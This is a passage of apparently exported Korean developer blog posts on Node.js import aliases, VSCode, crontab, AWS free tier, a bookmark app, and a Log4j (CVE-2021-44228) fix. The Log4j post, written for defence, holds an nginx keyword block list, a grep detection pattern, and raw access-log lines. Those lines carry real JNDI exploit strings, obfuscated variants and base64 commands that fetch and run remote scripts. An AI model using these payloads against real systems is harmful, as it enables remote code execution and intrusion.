해보니까 신기한게 많았다.  \n그리고 jQuery만 쓰고 수준 낮은 형태의 JS 개발을 했었던 내 개발 방법이 싫어서 이번에 JS도 다시 제대로 배워보고 있다.\n\n근데 Node에서 아주 답답한게 있었다....  \n난 ES6 형식으로 개발하는데 모듈을 임포트할 때 아래와 같은 문제가 있었다.\n\n```\nimport * as init from \"../../config/main_init.js\"\nimport * as auth from \"../../middleware/auth.js\";\n```\n\n저 경로 보이는가?  \n처음에 몇개 간단하게 쓸 때는 안거슬렸는데 점점 코드가 늘어나면서 상당히 귀찮게 되었다.\n\n게다가 해당 파일의 위치가 변경될 경우 이 부분도 문제가 되었다.  \n그래서 구글에 이것저것 찾아보는데 이쪽으론 어떤 식으로 키워드를 넣어야 할지 몰라서 좀 삽질했다.\n\n사실 간단한 패키지 하나 설치하면 끝났을 문제기도 한데...난 뭔가 더 설치하기가 좀 불편했다.  \n덕지덕지 쌓이기만 할 뿐더러 보안 문제가 생길수도 있을거 같아서 사람이 많이 받아서 쓰거나 가급적 안쓰는 방식으로 진행했다.\n\n<br>\n\n## 해결법 (Node 14.6.0 이상 또는 12.19.0)\n\n위에서 나온 버전에 해당되는 경우 아주 간단하게 그리고 다른 패키지를 설치하지 않고 해결할 수 있다.  \n먼저 package.json에서 다음과 같이 작성한다.\n\n```\n{\n  ...\n  \"license\": \"None\",\n\t\"type\": \"module\",\n\t\"imports\": {\n            ...\n            \"#middleware/*\": \"./some_path/src/middleware/*\",\n            \"#config/*\": \"./some_path/src/config/*\",\n            \"#route/*\": \"./some_path/src/route/*\",\n            \"#entity/*\": \"./some_path/src/entity/*\",\n            \"#util/*\": \"./some_path/src/utils/*\"\n            ...\n\t},\n\t\"scripts\": {\n\t\t\"dev\": \" nodemon ./start.js\",\n  }\n  ....\n}\n```\n\n위에서 잘 봐야 할 부분은 **import** 부분이다.\n여기서 양식은 아래와 같다.\n\n```\n[#지정 경로명/*] :  [실제 경로명]\n```\n\n앞은 **#**을 붙이고 원하는 경로명을 적고 **/\\*&nbsp;** 로 마무리를 적고, 뒤는 실제 경로면을 적으면 끝.\n그럼 코드에서 아래와 같이 import 할 수 있다.\n\n```\nimport * as init from \"#config/main_init.js\"\nimport * as auth from \"#middleware/auth.js\";\n```\n\n이렇게 사용이 가능하다.\n\n<br>\n\n## 해결법 (위 버전이 아닌 경우...)\n\n이 경우에는 패키지를 설치하는게 좋다...\n[module-alias](https://www.npmjs.com/package/module-alias) 라는 패키지인데 이걸로 해결하는게 깔끔할듯..\n\n> 여담인데 난 이 방법은 안써봤다.\n> <br>\n\n### 참고 링크\n\nhttps://stackoverflow.com/questions/33214780/how-to-have-path-alias-in-nodejs\n\n```toc\n\n```\n"},{"excerpt":"VSCode에서 한글이 깨질 때... 이번 M1 맥북을 사용하면서 기존에 Jetbrain 제품군을 사용하다가 Node.js 개발에 VSCode를 많이 사용한다 하여 이번에 써보기로 했다. 그런데 한글이 자꾸 한글자 한글자 씩 씹히는 현상이 발생했다. 아마 검색하다 들어온 사람은 무슨 말인지 이해할 듯.. 이걸 해결하는 법은 몇 가지 있는데 내가 적용된 방…","fields":{"slug":"/tools/220202_vscode-kr-break/"},"frontmatter":{"date":"February 02, 2022","title":"VSCode에서 한글이 씹히는 문제","description":null,"tags":["Tools","VSCode"],"series":"Tools","previewImage":"setting.png","isPrivate":null},"rawMarkdownBody":"\n# VSCode에서 한글이 깨질 때...\n\n이번 M1 맥북을 사용하면서 기존에 Jetbrain 제품군을 사용하다가 Node.js 개발에 VSCode를 많이 사용한다 하여 이번에 써보기로 했다.\n\n그런데 한글이 자꾸 한글자 한글자 씩 씹히는 현상이 발생했다.  \n아마 검색하다 들어온 사람은 무슨 말인지 이해할 듯..  \n이걸 해결하는 법은 몇 가지 있는데 내가 적용된 방법을 공유해본다.\n\n### 1. VSCode에서 모든 명령 표시 창 열기\n\n모든 명령 표시 창을 연다.  \n단축키는..\n\n> CMD+Shift+P\n\n![](/img_01.png)\n\n<br>\n\n### 2. 검색 창에 표시 언어 구성을 선택한다.\n\n표시 언어 구성을 입력하면 en만 있을텐데 ko를 선택하고 VSCode를 재시작 해준다.  \n만약 없다면 설치해주고 재시작 해주면 된다.\n\n![](/img_02.png)\n\n나같은 경우 이 방법으로 해결했다.\n\n```toc\n\n```\n"},{"excerpt":"크론탭을 수정하려 할 때.. 요새 잠시 개발을 손 놓았다가 다시 하게 되었는데 크론탭을 어떻게 수정해야 할지 막막했다 =.=;; 그래서 기억해둘 겸 간단 포스팅을 해두려 한다. 이 글은 우분투(Ubuntu) 20.04 인가 무튼 우분투 기준으로 작성되었다. 아래의 명령어를 입력한다. sudo vim /etc/crontab 그럼 현재 등록된 크론탭이 보이는…","fields":{"slug":"/ubuntu/220202_crontab-edit/"},"frontmatter":{"date":"February 02, 2022","title":"크론탭(Crontab) 내용 수정하기","description":null,"tags":["Ubuntu"],"series":"Ubuntu","previewImage":"ubuntu_logo.png","isPrivate":null},"rawMarkdownBody":"\n# 크론탭을 수정하려 할 때..\n\n요새 잠시 개발을 손 놓았다가 다시 하게 되었는데 크론탭을 어떻게 수정해야 할지 막막했다 =.=;;  \n그래서 기억해둘 겸 간단 포스팅을 해두려 한다.\n\n이 글은 **우분투(Ubuntu) 20.04** 인가 무튼 우분투 기준으로 작성되었다.  \n아래의 명령어를 입력한다.\n\n> sudo vim /etc/crontab\n\n그럼 현재 등록된 크론탭이 보이는데 해당 내용에서 수정하거나 추가 후 저장하고 나와서 아래의 명령어를 입력한다.\n\n> sudo crontab -e\n\n위와 같이 입력하면 크론탭이 수정되었다는 메시지가 나오고 처리는 끝난다.\n\n![](/img_01.png)\n"},{"excerpt":"AWS 프리티어 기간을 확인해보려면... 최근 개발용으로 쓰던 계정들의 프리티어가 언제까지인지 궁금해졌다. 이걸 확인해보는 방법은 간단했다. 1. AWS Console 에 접속한다.  위 사진과 같이 로그인 이후 우측 상단의 계정을 클릭하여 결제 대시보드 로 이동한다. 2. 청구서 항목을 클릭한다.  청구서의 청구 기간을 하단으로 내리면 최초 청구일이 나…","fields":{"slug":"/aws/220202_aws-free-final/"},"frontmatter":{"date":"February 02, 2022","title":"아마존 프리티어 기간 확인하기","description":"프리티어 기간 잘 확인하여 불미스러운 일을 방지하기","tags":["Aws","Infra"],"series":"Aws","previewImage":"aws_logo.webp","isPrivate":null},"rawMarkdownBody":"\n# AWS 프리티어 기간을 확인해보려면...\n\n최근 개발용으로 쓰던 계정들의 프리티어가 언제까지인지 궁금해졌다.  \n이걸 확인해보는 방법은 간단했다.\n\n### 1. AWS Console 에 접속한다.\n\n![](/img_01.png)\n\n위 사진과 같이 로그인 이후 우측 상단의 계정을 클릭하여 **결제 대시보드** 로 이동한다.\n\n<br>\n\n### 2. 청구서 항목을 클릭한다.\n\n![](/img_02.png)\n\n청구서의 청구 기간을 하단으로 내리면 최초 청구일이 나오는데 그거에서 **1년**이 지난 기간이 프리티어 기간이다.\n\n<br>\n\n---\n\n나처럼 개발용으로 사용하는 사람들은 이 기간을 잘 확인해두었다가 마지막 달에 사용하는 서비스를 모두 정리하고 계정을 탈퇴하면 된다.\n\n```toc\n\n```\n"},{"excerpt":"즐겨찾기 관리 프로그램을 만들다. 예전 포스팅 에서 공개했던 프로그램을 완성했다.\n사실 완성이라고 하기엔 뭐하고 쓸만할 정도가 되었다.  예전에 공개한 버전에서 UI를 조금 바꾸고 변경했다. 아직 미흡한 부분이 남아있지만... SML을 만들면서 몇 가지 목표가 있었고, 그 중 한가지가 내가 필요해서 만들었으니 나에게 맞는 기능을 만들어 써보자 였다. 사실…","fields":{"slug":"/my_project/211229_introduce-sml/"},"frontmatter":{"date":"December 29, 2021","title":"즐겨찾기 관리 프로그램 SML 배포","description":null,"tags":["MyProject","SML"],"series":"MHLab Project","previewImage":"strategy-pattern.png","isPrivate":null},"rawMarkdownBody":"\n# 즐겨찾기 관리 프로그램을 만들다.\n\n예전 [포스팅](https://elfinlas.github.io/til/211207_devnote/) 에서 공개했던 프로그램을 완성했다.\n사실 완성이라고 하기엔 뭐하고 쓸만할 정도가 되었다.\n\n![](/img_01.png)\n\n예전에 공개한 버전에서 UI를 조금 바꾸고 변경했다.  \n아직 미흡한 부분이 남아있지만...  \nSML을 만들면서 몇 가지 목표가 있었고, 그 중 한가지가 **내가 필요해서 만들었으니 나에게 맞는 기능을 만들어 써보자** 였다.\n\n사실 프로그래머 개발자 이런게 뭐 별거인가?  \n그냥 내가 필요해서 만드는게 그 직업군이지.\n\n무튼 그래서 내가 만들었고, 현재 잘 쓰고 있다.  \n노션에 정리할 때 보다 더 편리한거 같다.\n\n공개는 [Github](https://github.com/elfinlas/SML) 에 해뒀고, 다운로드는 [릴리즈](https://github.com/elfinlas/SML/releases) 페이지에서 가능하다.\n\n<br>\n\n소스코드는....정리좀 하고 올릴 예정이다.  \n너무 하나에 몰아두고 짜서 보기 어렵다...  \n뭐 누가 보겠느냐 싶겠지만 그래도 추가 기능 개발 및 향후 내가 만들 웹 서비스에 연동을 위해서 몇 가지 사전 작업을 해둬야 해서...\n\n곧 리펙토링 및 코드 정리가 끝나면 오픈할 예정이다.  \n참고로...  \n난 Javascript 라는것을 이번에 처음 공부하며 써보기 시작했다.  \n주로 Java 백엔드만 짜다가 제대로 공부해서 해보는 중이다.  \n뭐 이것도 사실 제대로 공부 안하고 일단 부딪쳐 보자 식으로 해본거지만....\n\nNode를 공부하다가 일렉트론을 생각하게 되어 잠시 샛길로 빠져 만든 것이다.  \n그래서 코드가 조잡하고 그럴 수 있다. (밑밥?)  \n일렉트론...좀 더 제대로 공부하면 더 좋은(?) 결과를 낼 수 있었지만...  \n이번 SML은 사실 구동과 기능의 정상 작동에 포커스를 맞춰서 잘못 개발했을 수도 있다.\n\n여담이지만 이걸 마지막으로 일렉트론은 접어둘 생각이다.  \n왜냐하면 곧 메인 개발을 해야 할 부분이 Node쪽이라서 그렇다.\n\n정리하자면...소스코드는 정리하고 공개할 예정이며...\n\n코드 오픈의 이유는 **필요한 사람이 직접 추가 기능을 개발해서 쓰라는 의미**로 오픈하는 거니 코드의 품질이나 개발 방법론은 **잠시 접어두자.**\n\n## 뭐로 만들고 구성이 어떻게 되나?\n\n일렉트론으로 만들었고, 화면단은 **Bootstrap 5**를 이용해서 만들었다.  \n원래는 지금 공부하는 리엑트를 적용해서 해볼까 했는데 이거 적용해서 하려면 너무 오래 걸릴거 같아서 그냥 부트스트랩으로 만들었다.  \n그리고 **jQuery를 이번에는 쓰지 말자**라고 결심을 해서 쓰지 않았다.  \n덕분에 바닐라.js ? 그냥 순수한 자바스크립트를 바닐라라고 부르는 것도 이번에 처음 알았다 '\\_';;\n\n디비쪽은 **SQLite**를 사용했다.  \n이런 작은 프로그램에서 쓰기엔 최고다.\n\n백업과 복원을 위해서 JSON 형식으로 처리했다.\n\n그 외 특이한 기술은 없고 Select 처리를 위해 치리오? 발음을 몰라서... [cheerio](http://github.com/cheeriojs/cheerio)를 사용했다.  \n알람창 이쁜거를 위해 **sweetalert2**를 사용했다.\n\n## 기능은?\n\n간단하다.  \n핵심 기능은 링크 데이터의 CRUD 이게 끝이다.  \n부가 기능으로 페이징과 검색정도?\n\n데이터 등록과 수정은 비슷하니 굳이 서술하지 않겠다.  \n다만 태그 기능에 대해 약간 부연 설명을 하자면...\n\n![](/img_02.png)\n\n위는 데이터 추가할 때 나오는 사진인데 모달 하단에는 태그를 위한 두 개의 선택 옵션이 있다.  \n하나는 기존에 추가된 태그를 선택하는 **select** 이고, 하나는 새로운 태그를 추가할 때 쓰는 **input** 이다.  \n이거 두개를 통합해서 사용하는 select 를 찾아봤는데... 죄다 jQuery 의존이 강하게 엮여있거나 vue, react 등으로 개발된 것들이었다.\n\n내가 직접 개발하기엔 시간도 오래 걸리고 해서 결국 저렇게 뻘짓으로 개발해뒀다.  \n혹시 더 좋은 라이브러리나 방법이 있다면 공유 해주시면 감사하겠다.\n\n백업의 경우 현재 SQLite에 저장된 모든 데이터를 JSON 파일로 뽑아서 특정 경로에 저장한다.  \nMac의 경우 자신의 홈디렉토리에 SML 디렉토리에 저장한다.  \n그런데 윈도우는 내가 안써봐서 이상한 경로에 저장하는 듯 한다.\n\nappData였나 무튼 추가하면 알림에 어느 경로에 저장되는지 표시는 뜨게 해두었다.\n\n## 윈도우 문제\n\n윈도우를 내가 안써서 잘 모르겠다.  \n일렉트론 빌드로 윈도우용 exe를 만들었고, 설치할 때 c:\\program files 인가 경로로 깔면 권한인가 뭐 때문에 정상적으로 안되는거 같았다.  \n그래서 테스트 환경에서는 d:\\ 에 새로운 경로를 만들고 거기에 설치를 하니 잘 되었다.  \n그런데 설치 완료 후 아래와 같이 윈도우 디팬더에서 트로이잔이 나온다.\n\n![](/img_03.png)\n\n왜 이런지 나도 잘 모르겠지만....  \n왠지 개발자 서명이 안되어서 그런게 아닐까 싶다.\n\n그래서 github Readme 에도 찝찝한 사람은 직접 빌드해서 쓰라고 명시해뒀다.  \n그리고 조만간 코드 오픈도 되니까 뭔가 문제가 있는 코드가 있었다면 메일이나 다른 채널로 알려주지 않을까 싶다 ㅎㅎ\n\n## 그래서 결론은?\n\n이번 프로그램을 배포 후 몇 가지 건의를 받은 것도 있는데 이 부분은 개발을 해서 버전 업을 할 예정이다.  \n거기까지 해두고 내가 만들려던 서비스를 만들어갈 예정이다.  \n뭐 이미 너무 아이디어가 공개되어 있어서 오픈할까 했지만 그래도 직접 만든 후 오픈하는게 좋지 않을까 싶어서 언급을 안하려 한다.\n\n깃허브 릴리즈 노트 같은것도 이쁘게 꾸며보고 싶었지만...  \n시간이 부족해서....  \n그냥 여기까지만 해두려 한다.\n\n해당 프로그램이 유용했다면 Github의 Star 한번 부탁드리고, 의견이나 버그 등이 있다면 메일로 부탁한다.  \n이 프로그램이 유용했기를 바라면서 다음 버전으로 인사드리겠다.\n\n```toc\n\n```\n"},{"excerpt":"요새 시끄러운 log4j2 공격...  요새 Log4J2 취약점 때문에 난리다. 사실 이 이슈가 알려진건 좀 되었다. (물론 일주일 전에 오픈된거로 알고 있긴 하지만...) 보안쪽은 이런 큰 문제가 터지면 바로 대응해야 한다. 조금만 늦게 대응하는 순간 비트코인 마냥 추락하는 거대한 손실을 껴안을 수 있다. 개발쪽은 역시 부지런해야 살아남는듯.... 사설…","fields":{"slug":"/spring_spring-boot/211214_springboot-log4j-hack/"},"frontmatter":{"date":"December 14, 2021","title":"Spring boot log4j 취약점 처리 후기 (CVE-2021-44228)","description":null,"tags":["Spring Boot"],"series":"Spring_SpringBoot","previewImage":"springboot_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n## 요새 시끄러운 log4j2 공격...\n\n![thumbnail](../thumbnail_spring.png)\n\n요새 Log4J2 취약점 때문에 난리다.  \n사실 이 이슈가 알려진건 좀 되었다. (물론 일주일 전에 오픈된거로 알고 있긴 하지만...)  \n보안쪽은 이런 큰 문제가 터지면 바로 대응해야 한다.  \n조금만 늦게 대응하는 순간 비트코인 마냥 추락하는 거대한 손실을 껴안을 수 있다.  \n개발쪽은 역시 부지런해야 살아남는듯....\n\n사설이 길었다.  \n이번 이슈에 대해서는 많은 사람이 적었기에 따로 언급은 안하겠다.  \n정 궁금하신 분은 **[이곳 KISA](https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389)** 에서 확인해보기 바란다.\n\n나는 현재 개인적으로 돌리는 서비스가 있는데 Spring boot 기반으로 되어 있다.  \n저 이슈보자마자 바로 문제가 생기겠구나 싶어서 확인했다.  \n처리는 금방 했는데 블로그에는 좀 늦게 올리게 되었다.\n\n<br>\n\n## 어떻게 공격이 들어오는가?\n\n일단 불법적으로 들어오는 것들을 조사하는 로그 서버에서 이런 결과가 들어있었다.\n\n![](/img_01.png)\n![](/img_02.png)\n\n동작 방식은 사실 대충 알고, 자세하게 동작하는 방식은 **[popit](https://www.popit.kr/log4j-보안-취약점-동작원리-및-jenkins-서버-확인-방법/)** 게시글을 참고하자.  \n(여담인데 난 원리까진 모르고 어떻게만 공격해서 들어오는지 까지만 알기에... 공격 기법이나 원리에 대한 설명은 무지해서 적을 수 없다....)\n\n내가 이해한 바로는 log.info 나 log.warn() 등을 통해 로깅을 할 때 메세지에 다음과 같이 적을 때 발생한다.\n\n> log.error(\"Req Access UA : \" + req.getHeader(\"X-Api-Version\") );\n\n위는 예시이다.  \n저런식으로 로그를 남기게 해서 공격자의 코드를 수행할 수 있게 한다는거 같다\n\n> jandi:ldap://공격자-ip/http443path\n\n위 사진을 보면 알겠지만 저렇게 ldap 뒤에 공격자의 주소를 넣어서 처리하는 식으로 들어온다.\n\n<br>\n\n## 그래서 어떻게 처리했는가?\n\n뭐 별거 없다.  \n그냥 log4j 버전업을 했다.  \n사진을 못찍었는데 나의 경우 spring boot starter 의 logging 이었나 이게 2.11 버전을 쓰고 있었다.\n\n그래서 그냥 버전을 올렸다.  \n**Gradle** 을 사용하는데 아래와 같이 한줄 넣어줬다.\n\n```gradle\n...\next['log4j2.version'] = '2.15.0'\n\ndependencies {\n  ....\n}\n....\n```\n\n위와 같이 한줄 넣고 gradle을 새로 받아오니 log4j의 버전이 2.15로 되었다.  \n이렇게 대응이 완료되었다.... ㅡ,.ㅡ;;\n\n그리고...이건 공격 대응이 될지 모르겠지만...  \nnginx 앞단에서 특정 키워드로 접근하는 것을 막는 부분에 다음과 같이 추가해줬다.\n\n```\n...\n\t~*(j_spring_security_check|wps|cgi|asmx|jndi|dns|securityscan|ldap) 1;\n...\n```\n\n이렇게 하면 서비스 접근 전에 nginx에서 컷 시킬수 있지 않을까 싶다. (안될수도?)  \n근데 이렇게 하니 로그 서버에 저런 비 정상적인 접근은 더 이상 들어오지 않았다.\n\n![](/img_03.png)\n\n단지 위와 같이 무지성으로 대입해서 들어오는 것들이 많을 뿐...\n\n그리고 하단의 참고 항목을 보면 Cisco talos 차단 권고 항목에 ip가 있다.  \n여기에 등록된 ip 전부 밴 처리 해뒀다.\n\n<br>\n\n## 정리 및 참고 그리고 부록...\n\n### 정리\n\n근데 개인적인 생각인데 User Agent 를 로깅 안하면 영향은 없지 않을까? (개인적 무지성 판단....)  \n얼른 대응해서 큰 피해 안나게 조심하자...\n\n<br>\n\n### 참고\n\n[래브라도 취약점 점검 도구-한글](https://labrador.iotcube.com)  \n[LG CNS의 차단 대응 및 안내 -한글](https://blog.lgcns.com/2740)  \n[Spring 공식 레퍼런스 대응 -영문](https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot)  \n[Log4J 악용탐지-영문](https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b)  \n[Cisco talos 차단 권고-영문](https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html)\n\n<br>\n \n### 부록 - 악용탐지\n\n위의 참고 중에 악용 탐지 gist 항목을 보면...  \n**/var/log 폴더 및 모든 하위 폴더의 압축되지 않은 파일에서 악용 시도** 에 대한 검색을 할 수 있는 grep 명령어를 제공한다.\n\n한번 돌려봤다.\n\n```\nfuck-hack@ip-999-444-999-444:~$ sudo egrep -I -i -r '\\$(\\{|%7B)jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):/[^\\n]+' /var/log\n/var/log/nginx/access.log.1:51.89.237.81 - - [13/Dec/2021:04:28:09 +0900] \"GET /$%7Bjndi:ldap://79.172.214.11:1389/Basic/Command/Base64/Y3VybCAxMzUuMTI1LjIxNy44Ny9qbmRpLnNoIHwgYmFzaA==%7D HTTP/1.0\" 404 162 \"-\" \"mozila\"\n/var/log/nginx/access.log.1:45.83.67.182 - - [13/Dec/2021:12:37:28 +0900] \"GET /$%7Bjndi:dns://45.83.64.1/securityscan-http80%7D HTTP/1.1\" 404 134 \"${jndi:dns://45.83.64.1/securityscan-http80}\" \"${jndi:dns://45.83.64.1/securityscan-http80}\"\n/var/log/nginx/access.log.1:45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] \"GET /$%7Bjndi:dns://45.83.64.1/securityscan-https443%7D HTTP/1.1\" 302 0 \"${jndi:dns://45.83.64.1/securityscan-https443}\" \"${jndi:dns://45.83.64.1/securityscan-https443}\"\n/var/log/nginx/access.log.1:45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] \"GET / HTTP/1.1\" 200 7587 \"${jndi:dns://45.83.64.1/securityscan-https443}\" \"${jndi:dns://45.83.64.1/securityscan-https443}\"\n/var/log/nginx/access.log.1:195.54.160.149 - - [13/Dec/2021:13:45:17 +0900] \"GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo} HTTP/1.1\" 200 396 \"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}\" \"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}\"\n/var/log/nginx/access.log.1:167.172.44.255 - - [13/Dec/2021:20:45:05 +0900] \"GET / HTTP/1.0\" 200 612 \"-\" \"borchuk/3.1 ${jndi:ldap://167.172.44.255:389/LegitimateJavaClass}\"\n\n=====\n\nfuck-hack@ip-999-444-999-444:~$ sudo find /var/log -name \\*.gz -print0 | xargs -0 zgrep -E -i '\\$(\\{|%7B)jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):/[^\\n]+'\n/var/log/nginx/access.log.3.gz:45.155.205.233 - - [11/Dec/2021:03:21:49 +0900] \"GET / HTTP/1.1\" 200 396 \"-\" \"${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDQ1LjE1NS4yMDUuMjMzOjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}\"\n/var/log/nginx/access.log.3.gz:1.116.59.211 - - [11/Dec/2021:19:13:15 +0900] \"GET /${jndi:ldap://45.130.229.168:1389/Exploit} HTTP/1.1\" 404 162 \"-\" \"curl/7.58.0\"\n/var/log/nginx/access.log.3.gz:195.251.41.139 - - [11/Dec/2021:21:13:15 +0900] \"GET / HTTP/1.1\" 200 396 \"-\" \"/${jndi:ldap://45.130.229.168:1389/Exploit}\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:02:26:12 +0900] \"GET / HTTP/1.1\" 200 7417 \"-\" \"${jndi:ldap://http443useragent.kryptoslogic-cve-2021-44228.com/http443useragent}\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:04:03:54 +0900] \"GET /$%7Bjndi:ldap://http443path.kryptoslogic-cve-2021-44228.com/http443path%7D HTTP/1.1\" 302 0 \"-\" \"Kryptos Logic Telltale\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:04:03:54 +0900] \"GET / HTTP/1.1\" 200 7418 \"https://3.36.159.204/$%7Bjndi:ldap://http443path.kryptoslogic-cve-2021-44228.com/http443path%7D\" \"Kryptos Logic Telltale\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:08:26:47 +0900] \"GET / HTTP/1.1\" 200 396 \"-\" \"${jndi:ldap://http80useragent.kryptoslogic-cve-2021-44228.com/http80useragent}\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:09:42:21 +0900] \"GET /$%7Bjndi:ldap://http80path.kryptoslogic-cve-2021-44228.com/http80path%7D HTTP/1.1\" 404 134 \"-\" \"Kryptos Logic Telltale\"\n/var/log/nginx/access.log.2.gz:45.155.204.20 - - [12/Dec/2021:10:01:33 +0900] \"GET /?x=${jndi:ldap://${hostName}.c6qjl3i5aulm7bb8ice0cg4wu5eyyek46.interactsh.com/a} HTTP/1.1\" 400 800 \"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6qjl3i5aulm7bb8ice0cg4wu5eyyek46.interactsh.com}\" \"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6qjl3i5aulm7bb8ice0cg4wu5eyyek46.interactsh.com}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:02:36:55 +0900] \"POST /?&token=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&sign=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&username=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&password=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&error=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&apikey=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&key=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D HTTP/1.1\" 405 0 \"-\" \"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:12 +0900] \"POST /api?&token=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&sign=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&username=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&password=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&error=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&apikey=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&key=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D HTTP/1.1\" 302 0 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:12 +0900] \"GET / HTTP/1.1\" 200 7637 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:12 +0900] \"GET /api?&token=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&sign=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&username=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&password=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&error=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&apikey=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&key=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D HTTP/1.1\" 302 0 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:13 +0900] \"GET / HTTP/1.1\" 200 7635 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:13 +0900] \"PUT /api?&token=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&sign=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&username=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&password=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&error=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&apikey=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&key=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D HTTP/1.1\" 302 0 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:13 +0900] \"GET / HTTP/1.1\" 200 7635 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:45.155.205.233 - - [10/Dec/2021:22:31:20 +0900] \"GET / HTTP/1.1\" 200 396 \"-\" \"${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDQ1LjE1NS4yMDUuMjMzOjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}\"\n/var/log/nginx/access.log.4.gz:45.155.205.233 - - [10/Dec/2021:23:27:05 +0900] \"GET / HTTP/1.1\" 200 7669 \"-\" 